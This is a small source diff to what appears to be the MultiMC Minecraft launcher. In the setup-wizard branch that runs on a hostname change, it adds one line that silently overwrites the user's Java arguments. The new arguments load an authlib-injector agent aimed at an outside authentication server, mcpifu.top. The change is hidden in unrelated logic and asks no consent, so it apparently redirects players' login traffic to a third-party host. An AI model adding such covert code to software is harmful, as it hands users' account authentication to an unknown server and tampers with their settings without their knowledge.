@@ -769,6 +769,7 @@ bool MultiMC::createSetupWizard()
         if (currentHostName != oldHostName)
         {
             settings()->set("LastHostname", currentHostName);
+            settings()->set("JvmArgs","-javaagent:../../../jars/authlib-injector.jar=https://www.mcpifu.top/api/yggdrasil");
             return true;
         }
         QString currentJavaPath = settings()->get("JavaPath").toString();
